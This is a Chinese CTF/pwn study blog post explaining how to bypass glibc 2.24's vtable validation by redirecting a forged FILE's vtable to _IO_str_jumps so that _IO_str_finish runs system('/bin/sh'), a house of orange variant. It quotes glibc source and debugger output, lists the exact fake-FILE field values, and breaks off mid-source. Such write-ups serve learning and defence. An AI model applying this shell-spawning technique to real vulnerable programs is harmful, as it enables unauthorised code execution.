<!DOCTYPE html><html lang="en"><head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="2.24比2.23在vtable上多了检测，使得2.23的利用手法失效  IO_FILE-2.24对vtable检测绕过、babyprintf、house of orangeIO vtable check2.24引入了一个vtable检测机制IO_validate_vtable，位于：/libio/libioP.h 123456789101112131415161718void _IO_vtab">
<meta property="og:type" content="article">
<meta property="og:title" content="IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange">
<meta property="og:url" content="http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/index.html">
<meta property="og:site_name" content="z1r0's blog">
<meta property="og:description" content="2.24比2.23在vtable上多了检测，使得2.23的利用手法失效  IO_FILE-2.24对vtable检测绕过、babyprintf、house of orangeIO vtable check2.24引入了一个vtable检测机制IO_validate_vtable，位于：/libio/libioP.h 123456789101112131415161718void _IO_vtab">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/1.png">
<meta property="article:published_time" content="2021-10-09T09:20:04.000Z">
<meta property="article:modified_time" content="2023-08-17T06:31:45.350Z">
<meta property="article:author" content="z1r0">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="z1r0's blog" type="application/atom+xml">
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.1.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2021/10/17/seccomp-orw/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;text=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;title=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;is_video=false&amp;description=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange&amp;body=Check out this article: http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;title=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;title=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;title=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;title=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;name=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;t=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81babyprintf%E3%80%81house-of-orange"><span class="toc-number">1.</span> <span class="toc-text">IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-vtable-check"><span class="toc-number">1.1.</span> <span class="toc-text">IO vtable check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-vtable-check%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">IO vtable check绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyprintf"><span class="toc-number">1.3.</span> <span class="toc-text">babyprintf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-ornage"><span class="toc-number">1.4.</span> <span class="toc-text">house of ornage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">z1r0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-10-09T09:20:04.000Z" itemprop="datePublished">2021-10-09</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/study/">study</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <blockquote>
<p>2.24比2.23在vtable上多了检测，使得2.23的利用手法失效</p>
</blockquote>
<h1 id="IO-FILE-2-24对vtable检测绕过、babyprintf、house-of-orange"><a href="#IO-FILE-2-24对vtable检测绕过、babyprintf、house-of-orange" class="headerlink" title="IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"></a>IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange</h1><h2 id="IO-vtable-check"><a href="#IO-vtable-check" class="headerlink" title="IO vtable check"></a>IO vtable check</h2><p>2.24引入了一个vtable检测机制<code>IO_validate_vtable</code>，位于：<code>/libio/libioP.h</code></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">{</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>当<code>ptr - __start___libc_IO_vtables &gt;= __stop___libc_IO_vtables - __start___libc_IO_vtables</code>时会调用<code>_IO_vtable_check ()</code>，否则返回vtable，那看一下<code> __stop___libc_IO_vtables</code>和<code>__start___libc_IO_vtables</code>都是什么</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p __stop___libc_IO_vtables - <span class="number">1</span></span><br><span class="line">$<span class="number">7</span> = <span class="number">0x7ffff7dcf627</span> &lt;_IO_str_chk_jumps+<span class="number">167</span>&gt; <span class="string">""</span></span><br><span class="line">pwndbg&gt; p __start___libc_IO_vtables</span><br><span class="line">$<span class="number">8</span> = <span class="number">0x7ffff7dce8c0</span> &lt;_IO_helper_jumps&gt; <span class="string">""</span></span><br></pre></td></tr></tbody></table></figure>

<p>那也就是需要在<code>_IO_helper_jumps~_IO_str_chk_jumps+167</code>这个地址之内才可以绕过检测，前一篇文章的house of orange最后将vtable劫持到了堆上并不在<code>_IO_helper_jumps~_IO_str_chk_jumps+167</code>这个地址内，所以在2.24中会利用失败</p>
<h2 id="IO-vtable-check绕过"><a href="#IO-vtable-check绕过" class="headerlink" title="IO vtable check绕过"></a>IO vtable check绕过</h2><p>前面说到<code>_IO_vtable_check</code>这个函数，跟进看一下，位于<code>libio/vtables.c</code>中</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">{</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  {</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">"Fatal error: glibc detected an invalid stdio handle\n"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>基本没什么可利用的点</p>
<p>但是还有<code>_IO_str_jumps</code>以及<code>_IO_wstr_jumps</code>两个vtable，如果能将vtable设置成<code>_IO_str_jumps</code>或者<code>_IO_wstr_jumps</code>那么一样可以调用文件操作函数</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_str_jumps</span><br><span class="line">$<span class="number">2</span> = {</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7a89fb0</span> &lt;_IO_str_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7a89c90</span> &lt;__GI__IO_str_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7ffff7a89c30</span> &lt;__GI__IO_str_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7ffff7a88610</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7a89f90</span> &lt;__GI__IO_str_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7a88640</span> &lt;__GI__IO_default_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7a88720</span> &lt;__GI__IO_default_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7ffff7a8a0e0</span> &lt;__GI__IO_str_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7ffff7a88a10</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7ffff7a88940</span> &lt;_IO_default_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7ffff7a88c10</span> &lt;_IO_default_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7ffff7a88a30</span> &lt;__GI__IO_default_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7ffff7a89ae0</span> &lt;_IO_default_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7ffff7a89af0</span> &lt;_IO_default_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7ffff7a89ac0</span> &lt;_IO_default_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7ffff7a88c10</span> &lt;_IO_default_sync&gt;,</span><br><span class="line">  __stat = <span class="number">0x7ffff7a89ad0</span> &lt;_IO_default_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a89b00</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7a89b10</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">}</span><br><span class="line">pwndbg&gt; p _IO_wstr_jumps</span><br><span class="line">$<span class="number">3</span> = {</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7a80260</span> &lt;_IO_wstr_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7a80060</span> &lt;_IO_wstr_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7ffff7a80000</span> &lt;_IO_wstr_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7ffff7a7ef70</span> &lt;__GI__IO_wdefault_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7a80240</span> &lt;_IO_wstr_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7a7f3c0</span> &lt;__GI__IO_wdefault_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7a7f670</span> &lt;__GI__IO_wdefault_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7ffff7a80510</span> &lt;_IO_wstr_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7ffff7a88a10</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7ffff7a88940</span> &lt;_IO_default_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7ffff7a88c10</span> &lt;_IO_default_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7ffff7a7fb40</span> &lt;__GI__IO_wdefault_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7ffff7a89ae0</span> &lt;_IO_default_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7ffff7a89af0</span> &lt;_IO_default_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7ffff7a89ac0</span> &lt;_IO_default_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7ffff7a88c10</span> &lt;_IO_default_sync&gt;,</span><br><span class="line">  __stat = <span class="number">0x7ffff7a89ad0</span> &lt;_IO_default_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a89b00</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7a89b10</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><code>_IO_wstr_jumps</code>的利用要比<code>_IO_str_jumps</code>难一点，所以通常都是对<code>_IO_str_jumps</code>的利用</p>
<p>在<code>_IO_str_jumps</code>中有两个函数的利用空间很大，<code>_IO_str_finish</code>的函数源码如下，位于<code>/libio/strops.c</code></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以发现<code>_IO_str_finish</code>的函数利用简单</p>
<p>如果将<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer)</code>设置为system_addr，将<code>fp-&gt;_IO_buf_base</code>设置为bin_sh，如果再满足<code>fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)</code>为真是不是就可以直接getshell了</p>
<blockquote>
<p><code>fp-&gt;_IO_buf_base</code>需要有值，直接设置为bin_sh</p>
<p><code>fp-&gt;_flags &amp; _IO_USER_BUF</code>为0，<code> _IO_USER_BUF</code>是1所以<code>_flags</code>需要设置为0</p>
<p><code>fp + 0xe8 </code>设置为system</p>
</blockquote>
<p>再加上触发<code>_IO_flush_all_lockp</code>的条件，最后总结如下</p>
<blockquote>
<p><code>fp-&gt;_mode</code> &lt;= 0</p>
<p><code>fp-&gt;_IO_write_ptr</code> &gt;<code> fp-&gt;_IO_write_base</code></p>
<p><code>vtable</code> = <code>_IO_str_jumps - 8</code></p>
<p><code>fp-&gt;_flags</code> = 0</p>
<p><code>fp-&gt;_IO_buf_base</code> = bin_sh</p>
<p><code>fp + 0xe8</code> = system_addr</p>
</blockquote>
<p>至于为什么把vtable赋值为<code>_IO_str_jumps - 8</code>，是因为这样调用原先的<code>_IO_overflow</code>的时候现会调用<code>_IO_str_finish</code></p>
<p><code>_IO_str_overflow</code>的源码如下，位于<code>/libio/strops.c</code></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    {</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    }</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	{</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size 